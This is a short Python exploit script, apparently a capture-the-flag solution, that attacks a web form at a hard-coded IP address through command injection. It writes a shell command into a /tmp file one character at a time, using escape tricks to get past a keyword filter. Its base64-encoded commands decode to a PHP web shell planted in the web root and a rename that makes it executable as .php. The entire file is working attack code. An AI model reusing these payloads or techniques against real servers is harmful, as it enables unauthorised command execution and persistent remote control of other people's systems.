import requests
from time import sleep


def gen_payload(ch,dir):
    if ch == ' ':
        return f'\\ \\\\>>/tmp/{dir}'
    elif ch == '/':
        return f'\/\\\\>>/tmp/{dir}'
    elif ch == '>':
        return f'\>\\\\>>/tmp/{dir}'
    elif ch == '<':
        return f'\<\\\\>>/tmp/{dir}'
    elif ch == '-':
        return f'-\\\\>>/tmp/{dir}'
    else:
        return f'{ch}\\\\>>/tmp/{dir}'
    
def main():
    s = requests.Session()
    #command = "cat /flagnyQJe"
    #command = "base64 -d <<< PD9waHAgZWNobyBwYXNzdGhydSgkX0dFVFsnY21kJ10pOyA/PiAg > /var/www/html/images/w"
    command = "base64 -d <<< bXYgL3Zhci93d3cvaHRtbC9pbWFnZXMvdyAvdmFyL3d3dy9odG1sL2ltYWdlcy93LnBocCAg > /tmp/d"
    url = "http://103.77.175.40:11121/"
    for i in command:
        r = s.post(url=url,data={"word":gen_payload(i,'i')})
        sleep(1)
        if r.status_code == 200 and 'Hắc cơ lỏ, hắc cơ lỏ ><' in r.text:
            print("Filtered !!!")
            r = s.post(url=url,data={"word":f"\ >/tmp/i"})
            break
if __name__ == "__main__":
    print("Running: . . .")
    main()
    print("Finished!!!")